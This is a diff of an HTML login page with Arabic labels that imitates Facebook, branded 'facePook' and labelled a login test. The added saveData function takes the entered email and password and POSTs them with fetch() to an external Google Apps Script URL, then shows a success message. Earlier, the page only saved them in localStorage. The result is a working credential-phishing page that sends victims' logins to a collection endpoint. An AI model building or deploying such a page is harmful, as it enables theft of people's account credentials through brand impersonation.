@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>facebook - Login Test</title>
+  <title>facePook - Login Test</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -46,7 +46,7 @@
 <body>
 
   <div class="login-box">
-    <h2 style="text-align:center;">facebook</h2>
+    <h2 style="text-align:center;">facePook</h2>
     <input id="email" type="text" placeholder="البريد الإلكتروني">
     <input id="password" type="password" placeholder="كلمة المرور">
     <button onclick="saveData()">تسجيل الدخول</button>
@@ -54,21 +54,39 @@
   </div>
 
   <script>
-    function saveData() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+  function saveData() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const msg = document.getElementById("msg");
 
-      // حفظ البيانات في localStorage
-      localStorage.setItem("savedEmail", email);
-      localStorage.setItem("savedPassword", password);
-
-      document.getElementById("msg").innerText = "تم حفظ بياناتك بنجاح (محليًا)";
+    if (email === "" || password === "") {
+      msg.style.color = "red";
+      msg.innerText = "يرجى ملء جميع الحقول.";
+      return;
     }
 
-    // يمكنك طباعة البيانات من localStorage:
-    console.log("Email:", localStorage.getItem("savedEmail"));
-    console.log("Password:", localStorage.getItem("savedPassword"));
-  </script>
+    // رابط السكربت الخاص بك هنا:
+    const scriptURL = "https://script.google.com/macros/s/AKfycbz2mCW5hA1gmFoWKvsZseY7oaWD1Wy0Md4cwJvCDTQBZT9xOd7RBgxmku-f27nxUOUC/exec";
+
+    fetch(scriptURL, {
+      method: 'POST',
+      body: new URLSearchParams({
+        'email': email,
+        'password': password
+      })
+    })
+    .then(response => {
+      msg.style.color = "green";
+      msg.innerText = "✅ تم إرسال البيانات بنجاح.";
+    })
+    .catch(error => {
+      msg.style.color = "red";
+      msg.innerText = "❌ حدث خطأ أثناء الإرسال.";
+      console.error('Error!', error.message);
+    });
+  }
+</script>
+
 
 </body>
 </html>
